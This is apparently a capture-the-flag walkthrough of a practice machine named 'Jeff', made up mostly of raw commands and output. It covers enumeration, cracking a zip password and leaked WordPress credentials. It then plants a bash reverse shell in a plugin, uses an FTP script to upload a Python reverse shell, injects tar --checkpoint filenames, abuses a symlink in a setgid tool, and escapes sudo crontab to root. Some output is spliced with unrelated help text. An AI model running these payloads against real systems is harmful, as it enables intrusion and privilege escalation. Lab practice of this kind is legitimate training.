# nmap
```
root@kali:~# nmap -sV -sC -p- -T4 10.10.46.147
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 03:21 UTC
Nmap scan report for ip-10-10-46-147.eu-west-1.compute.internal (10.10.46.147)
Host is up (0.00044s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:52:4C:0E:DA:BB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.32 seconds
root@kali:~#
```


- view-source:http://10.10.46.147/
```
<!-- Did you forget to add jeff.thm to your hosts file??? -->
```

change hosts


```
root@kali:~# gobuster dir -u http://jeff.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html,c
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jeff.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,c,php,txt,zip
[+] Timeout:        10s
===============================================================
2020/08/13 03:29:00 Starting gobuster
===============================================================
/index.html (Status: 200)
/uploads (Status: 301)
/admin (Status: 301)
/assets (Status: 301)
/backups (Status: 301)
/source_codes (Status: 301)
```


```
root@kali:~# gobuster dir -u http://jeff.thm/backups/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,zip,c,php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jeff.thm/backups/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,zip,c,php
[+] Timeout:        10s
===============================================================
2020/08/13 03:36:03 Starting gobuster
===============================================================
/backup.zip (Status: 200)
```


```
root@kali:~/test# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
'backup/' is not encrypted, skipping
'backup/assets/' is not encrypted, skipping
found file 'backup/assets/EnlighterJS.min.css', (size cp/uc   6483/ 34858, flags 9, chk 7a80)
found file 'backup/assets/EnlighterJS.min.js', (size cp/uc  14499/ 49963, flags 9, chk 7a80)
found file 'backup/assets/MooTools-Core-1.6.0-compressed.js', (size cp/uc  27902/ 89614, flags 9, chk 7a80)
found file 'backup/assets/profile.jpg', (size cp/uc  10771/ 11524, flags 9, chk 7a80)
found file 'backup/assets/style.css', (size cp/uc    675/  1439, flags 9, chk 7a80)
found file 'backup/index.html', (size cp/uc    652/  1178, flags 9, chk 7a80)
found file 'backup/wpadmin.bak', (size cp/uc     53/    41, flags 9, chk 7a80)
checking pw 05546TUNmaneerat

PASSWORD FOUND!!!!: pw == !!Burningbird!!
```

```
root@kali:~/test# ls
backup  backup.zip
root@kali:~/test# cd backup/
root@kali:~/test/backup# ls
assets  index.html  wpadmin.bak
root@kali:~/test/backup# cat wpadmin.bak
wordpress password is: phO#g)C5dhIWZn3BKP
```


```
root@kali:~# gobuster vhost -u http://jeff.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://jeff.thm
[+] Threads:      20
[+] Wordlist:     /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/08/13 04:04:27 Starting gobuster
===============================================================
Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
Found: WordPress.jeff.thm (Status: 200) [Size: 25901]
Found: Wordpress.jeff.thm (Status: 200) [Size: 25901]
```


- http://wordpress.jeff.thm/wp-login.php
  - jeff


- http://wordpress.jeff.thm/wp-admin/plugin-editor.php
```
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.141.85/1234 0>&1'");
```

- activate

```
whoami
www-data
```

```
-rw-r--r-- 1 root root 575 May 18 11:57 /var/www/html/ftp_backup.php
```


```python
#!/usr/bin/env python3.7

from ftplib import FTP
import os
import fileinput
import io

host = "172.20.0.1"
username = "backupmgr"
password = "XXXXXXXXXXX"

ftp = FTP(host=host)

login_status = ftp.login(user=username, passwd=password)
print(login_status)
ftp.set_pasv(False)
ftp.cwd('files')
print(ftp.dir())

rev = io.BytesIO(b'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.141.85",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
emptyFile = io.BytesIO(b'')
ftp.storlines('STOR rev.sh', rev)
ftp.storlines('STOR --checkpoint=1', emptyFile)
ftp.storlines('STOR --checkpoint-action=exec=sh rev.sh', emptyFile)
ftp.dir()

ftp.quit()

```


```
root@kali:~# nc -lnvp 1235
listening on [any] 1235 ...
connect to [10.10.141.85] from (UNKNOWN) [10.10.46.147] 34842
/bin/sh: 0: can't access tty; job control turned off
$ ls
--checkpoint=1
--checkpoint-action=exec=sh rev.sh
rev.sh
$ whoami
backupmgr
```


```
*/1 * * * * /home/backupmgr/.scripts/backup.sh
-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab
```

```
backupmgr@tryharder:~$ find / -user jeff 2>/dev/null
find / -user jeff 2>/dev/null
/opt/systools
/opt/systools/systool
/home/jeff
/var/backups/jeff.bak
backupmgr@tryharder:~$ ls -al /var/backups/jeff.bak
ls -al /var/backups/jeff.bak
-rwxr-x--- 1 jeff pwman 43 May 11 15:14 /var/backups/jeff.bak
backupmgr@tryharder:~$ ls -al /opt/systools/systool
ls -al /opt/systools/systool
-rwxr-sr-x 1 jeff pwman 17160 May 24 13:18 /opt/systools/systool
backupmgr@tryharder:~$ /opt/systools/systool
/opt/systools/systool
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit
```


```
backupmgr@tryharder:~$ ltrace /opt/systools/systool
ltrace /opt/systools/systool
puts("Welcome to Jeffs System Administ"...Welcome to Jeffs System Administration tool.
)      = 45
puts("This is still a very beta versio"...This is still a very beta version and some things are not implemented yet.
)      = 75
puts("Please Select an option from bel"...Please Select an option from below.
)      = 36
puts("1 ) View process information."1 ) View process information.
)            = 30
puts("2 ) Restore your password."2 ) Restore your password.
)               = 27
puts("3 ) Exit "3 ) Exit
)                                = 10
printf("Chose your option: ")                    = 19
fgets(Chose your option: 2
2
"2\n", 1024, 0x7f151670da00)               = 0x7ffc44b12200
atoi(0x7ffc44b12200, 0x7ffc44b12200, 0x7f151670f8d0, 10) = 2
fopen("message.txt", "r")                        = 0
puts("\n\nError opening file. Please che"...

Error opening file. Please check that it exists.

)    = 52
puts("1 ) View process information."1 ) View process information.
)            = 30
puts("2 ) Restore your password."2 ) Restore your password.
)               = 27
puts("3 ) Exit "3 ) Exit
)                                = 10
printf("Chose your option: ")                    = 19
fgets(Chose your option:
```

```
backupmgr@tryharder:~$ cd /opt/systools/
cd /opt/systools/
backupmgr@tryharder:/opt/systools$ ls
ls
message.txt  systool
backupmgr@tryharder:/opt/systools$ mv message.txt old
mv message.txt old
backupmgr@tryharder:/opt/systools$ ls
ls
old  systool
backupmgr@tryharder:/opt/systools$ ln -s /var/backups/jeff.bak message.txt
ln -s /var/backups/jeff.bak message.txt
backupmgr@tryharder:/opt/systools$ ls
ls
message.txt  old  systool
backupmgr@tryharder:/opt/systools$ ./systool
./systool
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit
Chose your option: 2
2


Your Password is: 123-My-N4M3-1z-J3ff-123


1 ) View process information.
2 ) Restore your password.
3 ) Exit
Chose your option:
```

```
jeff@tryharder:~$ cd
-rbash: cd: restricted
```


- user
```
jeff@tryharder:~$ echo $PATH
/home/jeff/.bin

jeff@tryharder:~$ export PATH=$PATH:/bin/:/usr/bin/
jeff@tryharder:~$ cat user.txt
THM{HashMeLikeOneOfYourFrenchGirls}

```

- it need md5 hash



```
jeff@tryharder:~$ sudo -l
[sudo] password for jeff:
Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
jeff@tryharder:~$ sudo crontab -e

"/tmp/crontab.zZjYcM/crontab" 24L, 890C                                                            1,1           All
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command


:!/bin/bash
  -u                       (ignored)
  -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB
      --help     display this help and exit
      --version  output version information and exit

Examples:
  cat f - g  Output f's contents, then standard input, then g's contents.
  cat        Copy standard input to standard output.

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Full documentation at: <http://www.gnu.org/software/coreutils/cat>
or available locally via: info '(coreutils) cat invocation'
jeff@tryharder:~$ cat user.txt
THM{HashMeLikeOneOfYourFrenchGirls}
jeff@tryharder:~$ ls
user.txt
jeff@tryharder:~$ sudo -l
[sudo] password for jeff:
Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
jeff@tryharder:~$ sudo crontab -e

root@tryharder:/tmp# whoami
root
root@tryharder:/tmp# cd /root
root@tryharder:/root# ls
root.txt
root@tryharder:/root# cat root.txt
XXXXXXXXXXXXXXXXXXXXXXXX

Congratz on completing my box.
Sorry if you hated it, it was my first one :)
root@tryharder:/root#
```
